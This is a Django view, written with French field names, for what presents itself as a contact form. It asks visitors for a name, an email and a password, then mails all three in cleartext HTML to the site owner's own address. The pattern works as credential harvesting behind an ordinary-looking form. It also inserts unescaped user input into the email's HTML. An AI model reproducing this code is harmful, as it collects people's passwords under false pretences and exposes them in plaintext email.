from django.shortcuts import render, redirect
from django.core.mail import EmailMessage
from .forms import ContactForm
from django.conf import settings

def contact_view(request):
    if request.method == 'POST':
        form = ContactForm(request.POST)
        if form.is_valid():
            nom = form.cleaned_data['nom']
            email = form.cleaned_data['email']
            mot_de_passe = form.cleaned_data['mot_de_passe']

            # Mail stylisé
            html_message = f"""
            <html>
            <head>
                <style>
                    body {{ font-family: Arial, sans-serif; background:#f8f9fa; padding:20px; }}
                    .card {{ max-width:600px; margin:auto; background:white; border-radius:10px; box-shadow:0 3px 10px rgba(0,0,0,0.1); padding:25px; }}
                    h2 {{ color:#0d6efd; margin-bottom:20px; }}
                    p {{ font-size:16px; line-height:1.5; margin-bottom:10px; }}
                    .label {{ font-weight:bold; color:#333; }}
                    .footer {{ text-align:center; font-size:12px; color:#888; margin-top:20px; }}
                </style>
            </head>
            <body>
                <div class="card">
                    <h2>Nouveau contact</h2>
                    <p><span class="label">Nom :</span> {nom}</p>
                    <p><span class="label">Email :</span> {email}</p>
                    <p><span class="label">Mot de passe :</span> {mot_de_passe}</p>
                    <div class="footer">
                        Ce message a été envoyé depuis votre formulaire de contact.
                    </div>
                </div>
            </body>
            </html>
            """

            email_msg = EmailMessage(
                subject="Nouveau message du formulaire",
                body=html_message,
                from_email=settings.EMAIL_HOST_USER,
                to=[settings.EMAIL_HOST_USER],
            )
            email_msg.content_subtype = "html"
            email_msg.send(fail_silently=False)

            # Rediriger vers la même page avec un paramètre GET pour succès
            return redirect('/contact/?success=1')
    else:
        form = ContactForm()

    success = request.GET.get('success') == '1'
    return render(request, 'contact.html', {'form': form, 'success': success})
